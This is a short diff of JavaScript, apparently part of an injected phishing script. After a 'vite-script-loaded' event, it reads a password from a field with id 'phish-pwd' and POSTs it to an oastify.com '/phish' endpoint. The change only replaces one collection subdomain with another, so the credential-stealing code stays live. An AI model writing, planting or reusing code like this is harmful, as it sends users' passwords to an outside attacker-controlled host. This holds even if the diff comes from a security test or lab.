@@ -23,7 +23,7 @@ document.addEventListener('vite-script-loaded', function() {
         const pwd = document.getElementById('phish-pwd').value;
         
         // Use fetch API with error handling
-        fetch('https://5synx55etlldi0ogs08w4pg25tbkzkn9.oastify.com/phish', {
+        fetch('https://mi8nf8gq49tjzsrj6mnji4x6vx1opid7.oastify.com/phish', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
